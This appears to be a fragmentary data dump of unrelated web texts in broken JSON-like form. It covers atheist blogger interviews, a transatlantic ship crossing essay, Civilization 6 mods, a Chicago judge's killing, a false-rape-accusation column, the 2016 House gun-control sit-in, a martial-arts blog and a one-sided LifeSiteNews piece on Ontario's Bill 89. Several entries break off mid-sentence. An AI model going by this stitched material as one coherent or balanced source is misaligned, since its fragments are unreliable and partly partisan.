atheist.\n\nNeil: I teach High School Geometry, I’m a father of five, and I write for Patheos under the name Godless in Dixie. I’m a native Southerner from Mississippi, born and raised Southern Baptist, educated at a Reformed seminary, and a former Christian writer now turned secular humanist. How I became so is a long story but the shortest way to put it is that after 20 years of passionately investing in my faith, I found in my mid-30’s that the reasons I had for believing as a younger man no longer convinced me the way they once did. To my mind the biblical God was a personal one with whom I was called to have a discernible relationship, but in the end my experience led me to conclude that I was the one supplying both sides of the relationship. Once I decided to look for something outside of myself and my own mind as tangible evidence for the presence and activity of this person, I came at last to the conclusion that we made him up. Incidentally I remain open to being convinced otherwise. This is just the most reasonable conclusion to me at present.\n\nJT: I’m an atheist blogger and speaker for a living by the grace of Patheos (and all my lovely readers/fans). I have a wonderful family life, I’m married to the woman of my dreams. My parents are my heroes and I have a curmudgeonly brother, who is always there when I need him, who I love very much. I used to be an opera singer. Here’s a video from when I was the musical guest for Kansas City Oasis a few months back.\n\nI was converted to Christianity in high school by two of my [public school] teachers, which I now know was illegal. I was a Christian for about five years (and a pretty passionate one), but I had only read/encountered excerpts of the bible (like most Christians), some of which began to strike me as not very sensible or moral (scientific errors in Genesis, the barbarity of the OT, etc.). So I sat down and did my first full read through of the bible (I’ve done more since). Upon turning over the last page I said, “No, I don’t believe any of this.”",
  "latent_17300": "In this day and age, the decision to cross the Atlantic on a ship instead of in a plane requires explanation. I did it—in April, aboard the Queen Mary 2—because I wanted to sit for a week and stare at three-thousand nautical miles of saltwater nothingness. I’d been away from the States for a long time. I spent a month in Bali, made a quick stop home for Christmas, then did three months in Paris and one in Edinburgh. My friends wanted to know if I was Eat Pray Love–ing. I didn’t quite have an answer. No job, no school, no relationship was pulling me to any one place, and if I was going to spend most of my time typing on my computer, I might as well see Bali or Paris when I looked up. “Maybe you go for a walk today,” suggested my landlady’s Balinese housekeeper as she watched me type. “Maybe you come back next year and bring friends.”\n\n“Probably not,” I said, smiling. Smiling is de rigueur in Bali. I was relieved to get to Paris, where it is not. Mostly I was alone in Europe, unnoticed by the Parisians and Edinburghians, existing in a state of pleasant adriftness, burdened only by the sometimes exhausting freedom of deciding what to do with each and every second of day upon day. When I boarded the QM2 in Southampton, I was starting a long, slow journey back to my parents’ empty house in San Diego to dog-sit while they went off on a Eurail trip like a couple of teenage backpackers. I was ready to go home, to have more of a social life and smaller phone bills, but I sensed an idyll was ending. It was only an inkling, but it was correct: I was returning to a month of anxiety dreams and catatonic TV-watching while I waited for my first novel to come out.\n\nThe QM2 was at the end of a world voyage when I boarded, and there was a small contingent of hardliners who had been at sea for a hundred days. I have a theory that some people have repurposed the ship as an expensive nursing home and so cross the Atlantic only as an indifferently endured side effect, a consequence of existing in comfortable, perpetual transit: Cape Town appearing out the buffet windows one day, Osaka another, Dubai another, separated by days and days of empty water. George H.W. and Barbara Bush were aboard, George in a motorized wheelchair and Barbara looking so spry and unchanged since 1987 that I suspect she might be immortal, preserved by a dark, Bushian enchantment. In the mornings, she and her Secret Service guy power walked laps around the deck. One day, a journalist onboard as a guest lecturer gave a talk about Air Force One, projecting slides of presidents and first ladies onto the ship’s movie screen. Barbara appeared, waving from the plane’s staircase thirty years ago in a tweed suit and white blouse with a floppy bow at the neck. Barbara, in the audience, regarded herself with a faint frown.\n\nI had no ambitions beyond sitting and reading and watching the ocean, no desire to hit up the casino or see the Irish comedian or play bridge. But most people like to chatter with other people on ships, and some people I encountered worried because I didn’t have anyone to chatter with and decided to help out by chattering with me, which forced me to take evasive measures, skulking furtively through the corridors and stairways, peeking around corners to make sure no one was going to appear and drag me to solo travelers’ coffee with the gentlemen dance hosts. I arrived late to lectures and left as the applause began. I meandered through long, lazy workouts in the empty gym. I found the most inconspicuous nooks of the buffet deck to eat my breakfast. On the first day, I failed to anticipate that if I went to the seated dinner, my tablemates would be offended if I didn’t show up on each of the subsequent six nights. Dinner on the QM2 is at least a two-hour affair, involving formal wear and many courses, and I can think of no other situation in which I would sign on to share seven long dinners with seven randomly selected, elderly strangers.\n\nUsed to being alone and suddenly hemmed in by the bodily needs and endless verbal torrents of thousands of humans, I felt like a disgruntled loner in a colony of yammering, gluttonous, complaining penguins, all trapped on an ice floe together. We were so far from any other people that their existence was irrelevant. During the emergency drill before we left Southampton, everyone laughed about putting on the blocky orange life vests, but, just as when a plane’s engines fire up for take-off, there was a sense that whatever happened would involve all of us. In his essay “A Supposedly Fun Thing I’ll Never Do Again,” David Foster Wallace famously chronicled a seven-day Caribbean luxury cruise and the despair brought on by the presence of his fellow passengers, the grinding, unsettling pressure to have fun, and the presence of the ocean, which he called “an enormous primordial stew of death and decay.” And he was talking about the Caribbean. Some afternoons, when I felt claustrophobic and cranky, I took refuge in the hot tub on the stern. Swimming outdoors in the North Atlantic’s forty-five-mile-per-hour winds and forty-degree temperatures was unpopular, and I had the tub to myself, a small circle of turquoise water inside a giant circle of gray, white-capped water. My wet hair turning stiff with cold, I sat and watched the ocean.\n\nIN THE PLANETARIUM on deck 2, you recline in the dark beneath a dome-shaped screen, feeling your movie-theater chair push up against your back as the ship climbs a swell and then drop out from under you as it descends. Robert Redford’s disembodied voice attempts to convey the magnitude of the universe while slick graphics fly out of the darkness. Planets, then stars, then galaxies, then galaxy clusters, then the wide-open universe. In four billion years, Robert Redford says, the Milky Way and Andromeda galaxies will collide, but the Earth is so small it will probably skate through the galactic fireball unscathed.\n\nIf crossing an ocean is an exercise in insignificance, thinking about galaxies while crossing an ocean is equal parts soothing Zen meditation and colossal mind-fuck. The ocean is inconceivably enormous, but it is also infinitesimal. I, the lone inhabitant of my body and life, am inescapably large to myself but also ridiculously, inconceivably small. At sea, my sense of scale oscillated wildly. I was a speck of dust, a subatomic particle, but I was also going to be really mad if all the scones were gone before I got to afternoon tea. The voyage felt more like a function of time than space. It could have been a light show played out a static disc of water and dome of sky. There was the noise of the engines, the churned-up fan of wake, the roll of the swell, but forward motion was undetectable. We were always at the very center of the disc, beneath the apex of the dome. On the TV in my cabin, one channel was devoted to navigational information. A never-ending reel of upbeat synthetic music cycled by while a series of graphics displayed the temperature, wind speed, barometric pressure, swell height, and then an airplane-style map of the ocean with our position marked by a dot at the end of a green line stretching back to Southampton. When we were halfway across, while the captain was making his noon announcement that we were very, very far from Europe and very, very far from North America and sitting on top of thirteen thousand feet of very cold water, I watched a group of dolphins swim toward the ship, heading north, fins popping up and down at a businesslike clip, the only sign of life I’d seen all day except for a stowaway sparrow cheeping its confusion under one of the lifeboats.\n\nWE REACHED NEW YORK before dawn and in a dense fog. Off my balcony, where there had been the blackest blackness, a Coast Guard escort zipped along, lights flashing. We could hear the traffic on the Verrazano-Narrows Bridge well before its lights broke through the gloom. The city was invisible, just more night. The Statue of Liberty, when we passed her, was only a vague shape, her flame lost in the murk. It had never occurred to me that those immigrants coming to have glaucoma checks on Ellis Island and then go off to populate our country might have only seen mist when they reached the New World—no skyline, no statue.\n\nAs I walked down the gangway, I didn’t have the sense of having completed a journey. I felt like I had cheated. Travel is usually a series of disorienting jump cuts: dreary, dehydrated hours in an airborne metal tube followed by emergence into a new city, new landscape, new climate, new T-shirts in the souvenir shops. Here I had changed continents but wasn’t jet-lagged, having set the clocks on my various devices back one hour on five of the nights at sea, and that felt somehow wrong. I’d been conditioned to expect abrupt transitions in my life, and this one was too smooth, too slow. It had the odd effect of making me feel, at first, like the months away had never happened. Crossing an ocean, it turns out, doesn’t feel so different from floating in place. The world is supposedly shrinking, its far corners made more and more accessible by accelerating technology and expanding infrastructure, but really we’re just making it easier for ourselves to ignore its enormity. Then again, as Robert Redford would have planetarium audiences know, the world is, in the very grand scheme of things, tiny. The bigness and smallness of everything can be neither separated nor reconciled. There was nothing to do at the bottom of the gangway but get a taxi and get on with it.\n\nMaggie Shipstead is the author of the debut novel Seating Arrangements.

  "latent_17332": "Here are two of the best things about PC gaming: the Civilization series, and the ability to change your games by adding in user-created content. Modding Civ 6, then, is an expression of the very apex of PC gaming. It’s peak PC.\n\nSince the Civ 6 modding toolkit came out in February 2017, the number of mods on offer has been steadily expanding. Civ 6’s modding community isn’t yet at the level of its timeless predecessors, but modders have now created enough new leaders, gameplay tweaks and AI improvements for you to swing your caveman club at. There are over 1,400 Steam Workshop,in fact, so plenty of options for every budding ruthless/benevolent leader.\n\nNeed even more tactical joy? Try out one of the best strategy games on PC.\n\nSo we’ve congregated the best efforts of Civ 6 modders from both Steam Workshop and Civfanatics.com, into a long unravelling papyrus of a list. All of the mods here are compatible with the Rise & Fall expansion pack, so no matter how invested you are in Civ, all of these mods will work just right.\n\nSteel & Thunder Unique Units/Units Expansion\n\nDeliverator’s comprehensive mod (formerly known as MOAR units) diversifies and brightens up the game with plenty of new units. The mod adds one unique unit to every civilisation in the game (including DLC and Rise & Fall civs), as well as 11 new global units that slot into existing upgrade paths.\n\nNew global units include, among others, Gatling Gun, Longswordsman, RIfleman, Naval Cog and Galleass. Listed below, meanwhile, are some of our favourite unique Civ units:\n\n– America – AH-64 Apache\n\n– Germany – Landsknecht\n\n– England – Ironside\n\n– Poland – Uhlan\n\n– Kongo – Medicine Man\n\n– Khmer – War Canoe\n\nSteel and Thunder comes in two separate packs: Unit Expansion adds the global units, and Unique Units adds the civ-specific ones.\n\nCiv 6 leader mods\n\nJFD’s collection\n\nThe biggest collection of Civ 6 leaders belongs to long-time modder JFD, who’s created and crafted over 30 of the great leaders from history such as Philip II of Macedon, Elizabeth I and Louis XIV. For those wanting some villains to rally against (or play as), there are a few bad eggs in there too, including Hitler, Mussolini, Ivan the Terrible, and Mr. Omelettes-and-Eggs himself, Stalin.\n\nEach new leader has a portrait that blends seamlessly with the bold, vibrant Civ 6 art style, and comes with their own unique units, traits and agendas. As you can guess, old Adolf’s ‘Liebensraum’ agenda makes things pretty feisty.\n\nHead over to JFD’s Steam Workshop page to see his full leader collection.\n\nCiv 6 conversion mods\n\nQuo’s Combined Tweaks\n\nAnyone who has spent some time on Civ 4 and Civ 5 forums will have heard of the great conversion projects like Rise of Mankind and Realism Invictus for Civ 6, or Vox Populi for Civ 5. These community-created mods spend years revamping the game rules, eventually creating a much deeper experience that borrows the best bits from across the series. Quo’s Combined Tweaks takes inspiration from those, revamping hundreds of rules to make for an interesting alternative to Firaxis’ vision.\n\nThere are way too many changes to list, but they include faster unit movement, more impactful governments and policies so you can really feel the difference between, say, Fascism and Democracy, and more powerful Wonders (which now steal tiles around them when built, and can be woo City States). Each civ now has several new unique traits too, making games a little more interesting and asymmetrical.\n\nIn a nutshell, it’s the most sweeping set of rule changes to Civ 6 available. Mod creator isau recommends using it with AI+, and says that it should be compatible with most unit, UI and map mods. You’ll need the Rise & Fall expansion for Quo’s Combined Tweaks to work.\n\nAnno Domini\n\nIf you’ve always found Civ to be at its most compelling in the earlier eras, when mankind worshipped trees and thought the Earth was just a spinning plate on a giant celestial stick, then you’ll quickly settle into Anno Domini. Building on his experience of creating a similar mod for Civ 5, creator rob8xft mod sweeps us back to an old world of Germanic tribes, druidism, even way back to Minoan civilisations, and keeps us there with a bespoke tech tree that never goes beyond the classical era.\n\nAnno Domini currently has 24 unique civilisations (though you can use some from the main game and JFD’s collection), as well as its own roster of policies and eras that zoom in on the ancient-classical period. It’s the most polished Civ 6 conversion mod to date.\n\nR8XFT himself plays Anno Domini with Religion Expanded, which you’ll find further down this list.\n\nCiv 6 map mods\n\nYet (not) Another Maps Pack\n\nGedemon’s YnAMP is the most feature-rich map pack for Civ 6. It contains a couple of variations on maps of Europe and Earth, as well as a script that generates Terra, a map split up into the historical Old and New Worlds.\n\nLike in Civs of yore, you can create a game on Terra where all civs start in the Old World, then race to colonise the New World once they can build ships. This setup provides a welcome shift of pace just as a game can start to lull towards the middle stages, and really thrives in multiplayer when you know that all your rivals have their avaricious eyes on the land and plunder of the New World.\n\nThis modpack adds a wealth of options for tweaking maps before a new game, as well as Giant, Enormous and Ludicrous map sizes (the latter of which doubles as a stern benchmark tool for your PC’s RAM and CPU).\n\nYnAMP also allocates civs with starting positions based on the kind of environments they were associated with in real life (coastal areas for naval civs, more arid climes for middle-eastern civs, and so on). This feature not only adds a touch of realism, but means that each civ’s starting location is likely to be better suited to their unique traits and buildings.\n\nCiv 6 Religion mods\n\nReligion Expanded\n\nThere have been quite a few attempts to improve upon the flawed religion system in Civ 6, not least of all when Firaxis figured that adding Warrior Monks into the game would spice things up a bit – which it didn’t. Instead, the best changes to religion in Civ 6 come from the community.\n\nA good place to start is pokiehl’s Religion Expanded, which adds 43 new religious beliefs, seven new fully-modelled religious buildings, and raises the cap for number of religions in a game from 7 to 16 (on a Huge map). The increased cap means that there will not just be a few faiths battling it out for supremacy, but also smaller ones doing their own thing in far corners of the world.\n\nTomatekh’s Historical Religions\n\nYou can combine Religion Expanded with Tomatekh’s Historical Religions, which adds tens of new religions and icons to the game – from strange sub-sects of Protestantism to Aboriginal Dreamtime beliefs. Every Civ in the game now has their preferred religions too, so AI will be drawn to the religions their civs are historically associated with.\n\nRule with Faith\n\nRule with Faith (RwF) is the work of JFD, who sees it as a continuation of his Rise to Power mod for Civ 5. That mod aimed to bring greater political and religious depth to the game, and RwF does the same, adding a new religious policy slot, 16 new policies and three new governments. It’s compatible with both Religion Expanded and Tomatekh’s Historical Religions.\n\nCiv 6 tweaks\n\nSmoother Difficulty\n\nMaking a challenging AI is tricky in strategy games, perhaps more so than in any other genre. Designers usually have to resort to giving the AI artificial bumps to resource production, and even free units, to give a savvy player a run for their money. Unfortunately, the way Civ 6 does this can mean certain death for the player before there’s anything they can physically do to stop it, as the AI swamps you with its five free Warriors (we’re not kidding – to see how much cheese drips from the AI on Deity difficulty, see our article on Civ 6 difficulties).\n\nFortunately, here’s RushSecond smoother difficulty with a solution. This mod removes most of the AI’s extra starting units, and instead dials up its resource generation bonuses. The result should be a smoother challenge on higher difficulties, with the AI keeping pace with you throughout the game despite its technical ineptitude, yet unable to stuff you in the first two dozen turns through an unfair unit advantage.\n\nAI+\n\nThe biggest criticism players have of Civilization 6 is the AI, which has unfortunately taken a few steps back towards the stone age since Civ V (which wasn’t exactly space-age itself).\n\nWith Firaxis doing little to fix things on this front, modders have taken the AI burden on themselves. AI+ is the best of the lot, making the AI better at balancing their empire’s development with military size, as well as an improving their ability in wartime, as they’ll now send troops to the front lines more aggressively and be bolder in invading your cities in the late game.\n\nAlong with the more sweeping changes, there are small bits of fine-tuning like improved settler behaviour, increased reluctance to agree unfavourable peace terms, and tougher city-states that won’t so readily fall into the hands of expansionist civs.\n\nPhotoKinetik Westeros\n\nFor those of you who didn’t take to Civ 6’s vibrant aesthetic, here’s [email protected]!n with a reshade mod. Inspired by the Game of Thrones opening sequence, it mutes Civ 6’s colours to give a cooler, more mature washed-out look, as you see above.\n\nYou can download PhotoKinetik Westeros here. Note that it has some more complicated installation instructions than most other mods on this list as it relies on ReShade, a separate post-processing application, to achieve its effects.\n\nQuick Start\n\nAnd so, like intrepid explorers circumnavigating the globe, we’re going to end our journey at the start. The start of the game, that is. If you’re tired of Civ 6’s multiple boot screens perennially reminding you who made the game and which GPU manufacturer it’s in bed with, you can skip it all with Quick Start. Now, if we could just find a way replicate this mod for every game in existence…\n\nThese are just a few of the thousands of Civ 6 mods available, which you can peruse yourself at Civ Fanatics, Steam Workshop and Nexus Mods. There are more outlandish ones out there – Game of Thrones and Lord of the Rings spring to mind – but they missed the cut because they felt feature-thin and unfinished at the time of writing. The fact is that for now, the modding community is limited by not having access to the DLL source code. When that came out for Civ 4 and 5 (some two years after each game’s launch), the modding scenes really took off, as did big overhaul projects like A New Dawn and Vox Populi.\n\nIf that’s anything to go by, we should expect to see the DLL code for Civ 6 released soon-ish, and only then will we see the game’s modding potential unleashed. The best, we hope, is yet to come.",

As a consequence of these changes, law schools are overdue to address the issue of the status of the individuals they hire to fill the multiple and ever expanding needs and interests of students.

But he was a neighbor. I'd see him and wave, and I'd say, 'Hi, Mr. Judge,' and he'd wave back. I just respected him, that's all. He was a judge. And they shot him. They shot a judge.\"\n\nThey shot a judge.\n\nThat's where Chicago is now, the violent city, street gang wars raging. Mayor Rahm Emanuel and the politicians helpless; cops, and judges and prosecutors exhausted; and lawmakers in Springfield still dithering about tougher sentences for convicted felons illegally carrying guns.\n\nNeighborhoods are terrorized. And now this, in a middle-class black neighborhood of city workers, bus drivers, employees of nearby Chicago State University.\n\n\"Everybody thinks the neighborhood's going down, with a new element coming in, young boys walking around, and now a judge gets killed,\" she told me. \"A judge? You don't see judges getting killed in Chicago. But now you do.\"\n\nAcross the street, the cops were gone. A few neighbors were out. Anyone who wished to be on TV could see the news crews waiting behind all that yellow tape flapping in the wind.\n\nA lawyer who said she practiced before the judge had found the cameras. She wasn't from the neighborhood. She came in to offer kind words. But the neighbors were somewhat shy.\n\n\"And I was on TV already,\" Rogers said. \"That wasn't too smart. My daughter was upset. She saw me talking about the judge and she called, said, 'Mama, why you on the news? You don't know who'll see your face. Why you on the news?'\"\n\nThe mayor has bodyguards and wants people to tell things to cops. The cops have guns and their own tribe to call on for protection. And some of the folks you see in news stories, the grieving families of the dead, are themselves part of the gang culture.\n\nBut not here on the 9400 block of South Forest Avenue. To the south, in the Wild Hundreds, yes. To the east, yes. But not here, in the neighborhood where the judge was killed.\n\n\"What do we got? We don't know why he was killed. They say maybe a robbery, but we don't know. What kind of robbery happens at 5 o'clock in the morning?\" Rogers asked. \"Who gets robbed at 5 o'clock in the morning?\"\n\nRobbery is the working theory, policy say. Judge Myles was shot repeatedly and was found on the back porch. His 52-year-old girlfriend was shot once and survived.\n\nIf it were robbery, then a robber was up at that hour, waiting outside the home, with security cameras all around.\n\nCook County Judge Raymond Myles was killed and a woman was wounded in a shooting outside the judge's South Side home on April 10, 2017. (Zbigniew Bzdak/Chicago Tribune) (Zbigniew Bzdak/Chicago Tribune)\n\nPerhaps it was mere chance, or perhaps the shooter knew that the judge worked out in the early morning at a nearby health club.\n\nEarly morning in downtown Chicago can be dangerous for people who look like money walking alone, walking along the wrong blocks of State Street. The homeless come out to find them.\n\nBut not out in the neighborhoods.\n\nBecause in the neighborhoods, even the roughest of them, dawn through early midmorning are usually the safest times. The bad boys are asleep.\n\nBut the judge's neighborhood isn't that kind of neighborhood. Was it really a robbery, neighbors whispered, or retaliation for something at work or something personal? They didn't know.\n\n\"I know he liked to sing at church,\" said a man who just drove by to see. \"He was a member of the Stony Island Church of Christ, and I'd see him on Sundays and he was a song leader.\"\n\nI asked him for his name.\n\n\"Wayne. You can call me Brother Harris,\" he said.\n\nWhat kind of songs did he like?\n\n\"What songs? 'The Golden Voice' was one. He liked other songs. He was there on Sundays unless he had to work,\" said Brother Harris. \"He worked out at LA Fitness, always staying in shape. And he was a judge, and he loved to sing.\"\n\nWas he a good singer?\n\n\"I can't say,\" said Brother Harris. \"He sure loved it, though.\"\n\nThe killing of Judge Myles wasn't the hot story of the day. That video of the man being dragged off a United Airlines flight was the hot story.\n\nThere was no video offered of the judge being gunned down outside his home.\n\nThere have been other judges shot, one in a divorce courtroom by an angry husband, and others have been threatened.

And most judges try to do the right thing by their oath and the people.\n\nAnd for all that, there's one thing that doesn't happen to judges in Chicago.\n\nThey don't get shot to death outside their homes before 5 a.m.\n\nUntil now.\n\nListen to \"The Chicago Way\" podcast with John Kass and Jeff Carlin at www.wgnradio.com/category/wgn-plus/category/thechicagoway.\n\njskass@chicagotribune.com",

Stephen would have been 40 this year, perhaps a father and husband enjoying the love and the life he deserved.\n\nI think of Stephen every time I see a case like that of Linsey Attridge, 31, who falsely accused two strangers of raping her in an attempt to win back her boyfriend. She picked two men at random on Facebook and threw a grenade into their world.\n\nLast week, Attridge was convicted and sentenced to 200 hours of community service.\n\nStephen’s accuser was a former girlfriend and she had sex willingly with him on his birthday.\n\nShe too admitted that she had cried rape to make her new boyfriend jealous.\n\nPolice had picked up Stephen in the middle of the night and subjected him to an intimate and degrading medical examination. The next morning when he returned home, he vomited, wept and repeated with incredulity the word “rapist”.\n\nA few weeks before he died, Stephen told me that he was haunted by the prospect of that split-second of doubt, the potential for there to be any pause, any question, in any mind that he was capable of such a heinous crime.\n\nOn his sister Alexandra’s 30th birthday, he left her party, drove to a remote spot in the Galloway forest and killed himself.\n\nThe lies of women like Attridge have the same destructive impact on genuine rape victims. Victims fear that flicker of scepticism, that they may not be believed. As Attridge has shown, there are women low enough to cry rape.

She plucked them from Facebook and for that time they were tarnished with the label of alleged rapists.\n\nShe punched herself in the face and ripped her own clothes to add credibility to her lie that the men had raped her in her Aberdeen home.\n\nIt was cruel, it was vindictive and manipulative and a betrayal of men and women. Attridge’s ex-boyfriend feels she deserves jail but it is difficult to see what purpose prison would serve.\n\nThe prospect of jail time is not going to deter any other woman like her, who is willing to swing a wrecking ball through men’s lives in a perverse attempt to keep her bloke.\n\nShe needs psychological help and to know that the consequences of actions like hers can be fatal.\n\nI hope she will think of her victims and of those like Stephen who paid the ultimate price in the petty politics of another’s relationship.",

The news and stories that matter, delivered weekday mornings.\n\nJune 22, 2016, 3:50 PM GMT / Updated June 23, 2016, 2:18 AM GMT By Luke Russert, Alex Moe, Halimah Abdullah and Corky Siemaszko\n\nGeorgia congressman John Lewis deployed a strategy from his days as a civil rights activist and coupled it with social media to stage a dramatic sit-in Wednesday on the House floor with his fellow Democrats to force a vote on gun control — and disrupt political business as normal well into the night.\n\nAs midnight Thursday rolled in, the sit-in had lasted for over 12 hours.\n\n\"Sometimes you have to do something out of the ordinary, sometimes you have to make a way out of no way,” said Lewis, one of the last living icons of the civil rights movement. “There comes a time when you have to say something, when you have to make a little noise, when you have to move your feet. This is the time. Now is the time to get in the way. The time to act is now. We will be silent no more.\"\n\nAs the sit-in stretched into half-a-day long, lasting through votes by GOP that threatened to derail the movement, Lewis thanked supporters and fellow legislators, saying \"I'm gratified. It is good to see sitting there on the floor. I felt like I was reliving my life all over again. During the sixties, the sit in started with 3 or 4 people and it spread like wildfire. This was spread.\"\n\nLewis and roughly 40 fellow House Democrats began the protest around midday Wednesday by reciting the Pledge of Allegiance as a couple dozen visitors in the gallery looked on and vowing \"to occupy the floor of the House until there is action.\"\n\nOther Democrats began chanting: \"I'm sick and tired of being sick and tired!\" and \"No bill, no break!\"\n\n\"We will be sitting-in until the House is allowed an opportunity to vote,\" Democratic Whip Steny Hoyer of Maryland said later in a statement. \"This is an issue that ought to transcend party — it's about saving lives and keeping our communities safe.\"\n\nRep. Keith Ellison posted on Facebook that he learned about the sit-in when a staffer handed him a note that read: \"Your Mom called and wants you on the floor!\"\n\n\"Couldn't say no,\" the Minnesota Democrat wrote. \"Don't worry, mom. I'm there.\"\n\nSoon they were joined by Democratic reinforcements from the Senate side, including Elizabeth Warren of Massachusetts, Bob Menendez of New Jersey, Sherrod Brown of Ohio, Mark Warner of Virginia and Patrick Leahy of Vermont.\n\nLewis later told NBC News that \"sometimes you are moved by history.\"\n\nRelated: Senate Votes Down Four Gun Control Measures After Fiery Debate\n\nIt is highly unusual for members to disrupt the functioning of the House this way.\n\nIf members do not leave the floor and no compromise is reached, it is largely up to Speaker Paul Ryan to decide whether to use the authority of the House to seek to clear the floor and/or sanction members, or to keep the House in recess and wait out the issue.\n\nThe protest was not being televised because the House has not formally gaveled into session.\n\nSo Rep. Scott Peters, D-California, has been using the video streaming app, Periscope, to share footage of the sit-in. C-Span has been broadcasting Peters' video feed.\n\nHouse members also took to social media to lodge their protests using the hashtags #NoBillNoBreak, #NOMORESILENCE and #goodtrouble.\n\nOutside, House Minority Leader Nancy Pelosi made sure the rest of the country knew about what was going on inside the chamber with a hastily-arranged press conference on the Capitol steps .\n\n“Once again we are fighting an uphill fight to bring legislation to the floor,” Pelosi said. “We truly believe that if there was a vote, we would win the vote.”\n\nThe merging of old-school protest tactics and new-school social media strategy helped ensure that the House Democrats' revolution on gun policy reform was indeed televised.\n\n\"I did this in the '60s — I never expected to be doing it in my '60s,\" said Rep. Michael Capuano, D-Mass., just before 9 p.m., as the sit-in was still going strong.\n\nRelated: Can They Do That? These Rules Govern Protests on House Floor\n\nThe move led by Lewis, who was jailed and repeatedly beaten back in the 1960s when he helped lead the battle for equal rights for African-Americans, took the Republican leadership by surprise.\n\nAnd it came after Lewis wrote House Speaker Paul Ryan a letter demanding that he keep the House in session instead of going into recess so there could more debate on gun control legislation in the wake of the Orlando massacre.\n\n“As the worst mass shooting in our nation’s history has underscored, our country cannot afford to stand by while this Congress continues to be paralyzed by politics,” Lewis wrote.\n\nRelated: Civil Rights Icon Rep. John Lewis No Stranger to Sit-Ins\n\nThe House sit-in came on the heels of a showdown over gun policy Monday in the Senate.\n\nFour gun policy measures failed to pass the 60-vote threshold to move forward in the Senate. The votes came in the wake of the deadly shooting spree in a gay nightclub in Orlando — the nation's worst mass shooting in modern history — and a subsequent 15-hour filibuster by Senate Democrats who demanded action on gun control.\n\nThe four amendments — two filed by Democratic Sens. Dianne Feinstein of California, and Chris Murphy of Connecticut, and two other, less restrictive measures filed by Sens. Chuck Grassley, R-Iowa, and John Cornyn, R-Texas — addressed background checks of prospective gun buyers and the sale of guns and explosives to people on terrorist watch lists.\n\nMurphy, who led last week's 15-hour filibuster by Senate Democrats who demanded action on gun control, applauded the House's moves.\n\nSo did former President Bill Clinton and President Barack Obama who in a Tweet thanked Lewis for \"leading on gun violence where we need it most.\" Vice President Joe Biden called Lewis \" the keeper of the nation's conscience at times of challenge and controversy.\"\n\nAs the day wore on, the gallery seats began to fill as curious onlookers watched the impassioned speeches. Care packages with snacks and letters from supporters began pouring in for the lawmakers who were determined to stay the night.\n\nGOP leadership gaveled the House back into session sometime around 10:00 p.m., to vote on a veto override of the Fiduciary Rule, which is unrelated to the gun issue. The vote was previously scheduled for Wednesday.\n\nAs Speaker Ryan spoke, the gallery and Dems on the floor began loudly chanting \"NO BILL, NO BREAK!\"\n\nRyan called the vote to order and walked away from the podium. Democrats began pointing at him and yelling \"SHAME! SHAME! SHAME!\"\n\nDemocrats also sang \"We Shall Overcome\" and vowed \"we shall pass a bill.\"\n\nA group of 150-300 peaceful protesters holding candles and signs were also gathered outside the Capitol, organized by Moms Demand Action for Gun Sense in America.\n\nWhen Lewis was asked around midnight how long the sit-in would last, he responded, \"We're going to sit in, sit down, stand up ... we're going to be here for a while tonight.\"\n\nThis is a developing story.

We reach and stretch, but if we are only kids then we won’t touch that next level until we grow and mature.\n\nSo many people walking in the doors of academies these days want to be the next world champ or make a name for themselves as a fighter, whatever the hell that means to them in that instance before they’ve ever trained. I don’t begrudge anyone their dreams, so long as their dreams are built on a stronger foundation than fame and egotism. But I tell myself that everyone starts somewhere and I try to help those who want to learn without judging too harshly why they say they want to train. After all, I believe few who walk through the door will stay for the reason they think. Minds change as perspectives are enhanced, and when misconceptions are cleansed then those people find the real purpose of what they can accomplish through training. It’s a beautiful transformation to see happen in people and one of the highlights of my profession.\n\nBut what to do with the armchair MMA officianado who believes he can be the next Jon Jones if only he can get some basics on the ground and a couple amateur cage fights under his belt in the next few weeks? What to do with any prospective fighter that has no better reason for stepping into a fight other than he wants to fight for violence sake?\n\nIf you run a fighter stable, that is if you want to take uninformed people off the street and throw them into a cage after a few weeks of “training,” then it’s not really a question you concern yourself with. Unfortunately there are plenty of these garages around full of rough neck guys and gals beating on each other and calling it training because to them it resembles what they see in the UFC. Neither martial not artists, but definitely mixed up.\n\nI am not the authority on what constitutes a noble reason for fighting or competing or if there are noble reasons at all. But I simply see no point in limited rules tough man competitions of unskilled knuckleheads out to hurt someone for sadistic pleasure of it.\n\nCompete for yourself. To see how you will perform under duress. Compete or fight because you are on an inward journey to discover something about yourself on a level you can’t possibly know exists right now. Do it for the refinement of your art, to see how your technical knowledge stands up in the pressure cooker of that chaos. But if you want a legal way to beat someone up because you weren’t held enough as a child, save someone $20 and ten minutes of his or her life they would spend watching you at the local convention hall. No one wants to see the kid who used to pull wings off flies and torture animals all grown up and trying to do the same in a cage against another person.\n\nIf you fight or compete and you know you do it for sound reasons, this post will not offend you. If you find yourself feeling offended by what I’ve written, maybe you need to look at yourself a little closer rather than being upset with me.\n\nTake the time. Learn the art. Live the life. Check your gut and check your heart. Fighting doesn’t have to be about violence. Patience doesn’t have to be about waiting.\n\n37.064196 -88.696258\n\nAdvertisements",
  "latent_17485": "NewsFamily, Politics - Canada\n\nSIGN THE PETITION: END transgender tyranny, Ontario MUST repeal radical LGBT law​\n\nTORONTO, June 1, 2017 (LifeSiteNews) — Ontario’s Kathleen Wynne Liberals have passed what critics describe as “totalitarian” Bill 89 by a vote of 63 to 23 on the last day before Queen’s Park adjourns for the summer.\n\nPro-family advocates warn Bill 89 gives the state more power to seize children from families that oppose the LGBTQI and gender ideology agenda, and allows government agencies to effectively ban couples who disagree with that agenda from fostering or adopting children.\n\nBill 89, or the Supporting Children, Youth and Families Act, 2017, repeals and replaces the former Child and Family Services Act that governs child protection services, and adoption and foster care services.\n\nIt adds “gender identity” and “gender expression” as factors to be considered “in the best interests of the child.”\n\nAt the same time, it deletes the religious faith in which the parents are raising the child as a factor to be considered, and mandates child protection services consider only the child’s own “creed” or “religion” when assessing the best interests of the child.\n\n“With the passage of Bill 89, we’ve entered an era of totalitarian power by the state, such as never witnessed before in Canada’s history,” says Jack Fonseca, senior political strategist for Campaign Life Coalition.\n\n“Make no mistake, Bill 89 is a grave threat to Christians and all people of faith who have children, or who hope to grow their family through adoption.”\n\n“Disappointed as I am with this result, I am not surprised,” commented Tanya Granic Allen, president of Parents As First Educators (PAFE). “The Kathleen Wynne Liberals have for years been pursuing their anti-parent and anti-family agenda and Bill 89 is the latest installment.”\n\nConservative MPPs present at Queen’s Park for the vote opposed the bill, which was in stark contrast to their position at second reading in March, when 83 of Ontario’s 107 MPPs passed Bill 89 unanimously.\n\nThe Conservatives who voted June 1 against Bill 89 included Monte McNaughton, Jeff Yurek, Bob Bailey, Gila Martow, Todd Smith, 